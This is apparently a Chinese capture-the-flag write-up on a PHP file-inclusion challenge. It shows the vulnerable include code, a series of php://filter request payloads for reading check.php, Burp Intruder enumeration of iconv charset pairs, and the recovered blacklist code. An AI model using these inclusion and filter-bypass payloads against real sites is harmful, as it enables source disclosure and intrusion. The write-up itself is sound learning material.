ailx10说：这篇是在2024年12月之前写的，后来又改过。这道文件包含题里，常用的 filter 写法并没有一路放行，我得先看不同输入各自得到什么反馈，再用 Intruder 枚举字符集组合，想办法把 check.php 读出来。读到源码后，关键词、数字和星号这些限制才终于有了上下文，后面再去找 flag.php，就不再是盲试。这篇把“先读判断代码，再按条件构造”的过程留下了。拿到一次内容只是中间站，真正有用的是它告诉我前面的过滤究竟在拦什么，也让我知道下一次尝试应该少猜一点。

原题讨论可控输入进入 include 和特定过滤规则；字符转换是否可用依赖运行时扩展与系统支持。

![](/notes-assets/d4ca15e5c286b7cc16b6.webp)

```
<?php

highlight_file(__FILE__);

    include("./check.php");

    if(isset($_GET['filename'])){

        $filename  = $_GET['filename'];

        include($filename);

    }

?>
```

代码审计，一眼看就是文件包含，但是发现有拦截

![](/notes-assets/87b905b5a61b2d43ed98.webp)

尝试 php://filter 文件包含，应该是触发了黑名单关键字，提示 do not hack!

![](/notes-assets/a76c285004c4ec850158.webp)

尝试 php://input 文件包含，提示 you have use the right usage , but error method，但是也没有找到突破口

![](/notes-assets/94238ca0e9e12ce7c983.webp)

尝试使用其他的 php://filter 文件包含，观察结果变化，发现字符集是突破口

```
# base64 编码 提示 do not hack! 

GET /?filename=php://filter/convert.base64-encode/resource=./check.php HTTP/1.1



# rot13 编码 提示 do not hack! 

GET /?filename=php://filter/read=string.rot13/resource=./check.php HTTP/1.1



# 转小写 提示 do not hack! 

GET /?filename=php://filter/read=string.tolower/resource=./check.php HTTP/1.1



# 去除 html/php 标签 提示 do not hack! 

GET /?filename=php://filter/read=string.strip_tags/resource=./check.php HTTP/1.1



# 将数据转换为 quoted-printable 格式  提示 do not hack! 

GET /?filename=php://filter/read=convert.quoted-printable-encode/resource=./check.php HTTP/1.1



# 字符集从 UTF-8 转换到 UTF-32 提示 you have use the right filter , but error usage

GET /?filename=php://filter/convert.iconv.utf-8.utf-32/resource=./check.php 
```

使用 Burp Suite 的 Intruder 模块，设置好 payload 位置

![](/notes-assets/e3450d24e7ef38c63cdb.webp)

设置 payload 的内容，点击开始攻击，总共请求5000多次

![](/notes-assets/e5b58e4e4bc3e0259919.webp)

原文称截图中有 12 组可读取 check.php；具体成功链需要逐张核对，不能仅凭正文中的失败示例复现。

```
<?php

if($_GET["filename"]){

        $preg_match_username = 'return preg_match("/base|quoted|write|rot13|read|zlib|print|string/i", $_GET["filename"]);';

        if (eval($preg_match_username)) {

        exit("do not hack!");

    }

    if(!eval($preg_match_username)){

        $preg_match_username2 = 'return preg_match("/BE|16|8|32|2/i", $_GET["filename"]);';

        if (eval($preg_match_username2)) {

                exit("you have use the right filter , but error usage");

        }

        $preg_match_username3 = 'return preg_match("/4\*/i", $_GET["filename"]);';

        if(!eval($preg_match_username3)){

                exit("you have use the right usage , but error method");

        }

    }

}
```
